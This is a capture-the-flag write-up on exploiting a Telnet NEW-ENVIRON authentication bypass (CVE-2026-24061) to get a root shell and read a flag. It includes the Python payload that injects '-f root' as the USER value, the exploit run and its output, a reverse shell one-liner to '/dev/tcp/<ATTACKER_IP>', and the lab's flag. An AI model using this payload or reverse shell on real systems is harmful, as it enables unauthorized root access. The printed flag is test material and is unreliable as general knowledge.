# CVE-2026-24061 — Telnet NEW-ENVIRON Authentication Bypass

**Platform:** [Teletype](https://teletype.ctf) — Basic  
**Category:** Broken Access Control / CVE  
**Points:** 50  
**Difficulty:** Basic  
**Flag:** `flag_847bb2b0_f4f8_48c3_8ddb_8c791750fb96`

---

## Description

> You are tasked with compromising a single Linux target running a legacy remote access service. Your objective is to identify the vulnerable service, exploit CVE-2026-24061 to gain unauthorized access, and retrieve the flag.

---

## Attack Chain Overview

```
[ Attacker — Kali Linux ]
        |
        | 1. wget → download PoC telnet_rce.py from GitHub
        v
[ SafeBreach-Labs / CVE-2026-24061 ]
        |
        | 2. python telnet_rce.py 10.8.0.2 (port 23)
        v
[ Telnet Server — Ubuntu 22.04 AWS (10.8.0.2) ]
        |
        | 3. Server sends: IAC DO NEW_ENVIRON
        v
[ Client replies: IAC SB NEW_ENVIRON IS VAR "USER" VALUE "-f root" IAC SE ]
        |
        | 4. telnetd passes "-f root" to /bin/login → auth bypass
        v
[ root@ip-176-16-22-236 — no password required ]
        |
        | 5. cd /home && cat local.txt
        v
[ FLAG: flag_847bb2b0_f4f8_48c3_8ddb_8c791750fb96 ]
```

---

## Step 1 — Download the PoC

**Explanation:**  
SafeBreach Labs published a ready-to-use Python exploit for CVE-2026-24061 on GitHub. It implements a raw Telnet client that intercepts the `NEW_ENVIRON` negotiation and injects a malicious `USER` value. We grab it with `wget`.

```bash
wget https://raw.githubusercontent.com/SafeBreach-Labs/CVE-2026-24061/refs/heads/main/telnet_rce.py
```

**Output:**

```
--2026-03-13 10:00:04--  https://raw.githubusercontent.com/SafeBreach-Labs/CVE-2026-24061/refs/heads/main/telnet_rce.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6807 (6.6K) [text/plain]
Saving to: 'telnet_rce.py'

telnet_rce.py   100%[==================================>]   6.65K  --.-KB/s    in 0s

2026-03-13 10:00:04 (64.6 MB/s) - 'telnet_rce.py' saved [6807/6807]
```

---

## Step 2 — Exploit CVE-2026-24061

**Explanation:**  
CVE-2026-24061 abuses the Telnet `NEW_ENVIRON` option (RFC 1572). During session setup, the server sends `IAC DO NEW_ENVIRON` asking the client to supply its environment variables. The vulnerable `telnetd` takes the client-provided `USER` value and passes it **unsanitized** to `/bin/login`:

```
/bin/login -f root
```

The `-f` flag means *force login* — skip password authentication entirely. By injecting `-f root` as the `USER` value, we get a root shell with no credentials.

**Malicious IAC payload sent by the script:**

```python
# Inside handle_subnegotiation()
env_msg = (
    bytes([IAC, SB, NEW_ENVIRON, IS, VAR]) +
    b'USER' +
    bytes([VALUE]) +
    "-f root".encode('ascii') +   # <-- the injection
    bytes([IAC, SE])
)
```

**In raw bytes:**
```
FF FA 27 00 00 55 53 45 52 01 2D 66 20 72 6F 6F 74 FF F0
```

**Command:**

```bash
python telnet_rce.py 10.8.0.2
```

**Output:**

```
[*] Connected to 10.8.0.2:23
[*] Interactive session started. Use Ctrl+C to quit.

Linux 6.8.0-1040-aws (ip-176-16-22-236) (pts/0)
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1040-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System load:  0.21              Processes:             115
  Usage of /:   28.9% of 7.57GB  Users logged in:       0
  Memory usage: 61%               IPv4 address for ens5: 176.16.22.236
  Swap usage:   0%

root@ip-176-16-22-236:~#
```

> **Alternative — Reverse Shell:**  
> For a more stable session, upgrade from the Telnet shell to a reverse shell:
> ```bash
> # On attacker machine — open listener
> nc -lvnp 4444
>
> # In the root Telnet session on target
> bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
> ```

---

## Step 3 — Retrieve the Flag

**Explanation:**  
With a root shell, we list the home directory and read the flag file.

```bash
root@ip-176-16-22-236:~# ls
snap  this_is_not_part_of_the_lab.ovpn

root@ip-176-16-22-236:~# cd /home

root@ip-176-16-22-236:/home# ls
local.txt  ubuntu

root@ip-176-16-22-236:/home# cat local.txt
```

**Output:**

```
flag_847bb2b0_f4f8_48c3_8ddb_8c791750fb96
```

---

## Flag

```
flag_847bb2b0_f4f8_48c3_8ddb_8c791750fb96
```

---

## Vulnerabilities Exploited

| CVE              | Type                     | Component               | Impact                                      |
|------------------|--------------------------|-------------------------|---------------------------------------------|
| CVE-2026-24061   | Broken Access Control    | Linux `telnetd`         | Auth bypassed → direct root shell           |
| —                | Unvalidated client input | `NEW_ENVIRON` (RFC 1572)| `-f root` injected into `/bin/login` call   |

---

## Key Takeaways

1. **Telnet is a legacy risk.** It transmits all data in cleartext and has no modern authentication mechanisms. It should always be replaced by SSH.
2. **Never pass client input directly to system calls.** The `USER` environment variable supplied by the client was forwarded unsanitized to `/bin/login`, enabling argument injection.
3. **Security through obscurity doesn't work.** Running a service on an unexpected port (or disguising Telnet as SSH port 22) does not mitigate the underlying vulnerability.
4. **Legacy daemons are unpatched attack surfaces.** `telnetd` is effectively unmaintained. Any system still running it is exposed to known exploits.
5. **Apply the principle of least privilege.** A remote access service should never be capable of granting a passwordless root session under any circumstances.

---

## Sources

- https://github.com/SafeBreach-Labs/CVE-2026-24061
- https://datatracker.ietf.org/doc/html/rfc854 — Telnet Protocol Specification (RFC 854)
- https://datatracker.ietf.org/doc/html/rfc1572 — Telnet NEW-ENVIRON Option (RFC 1572)
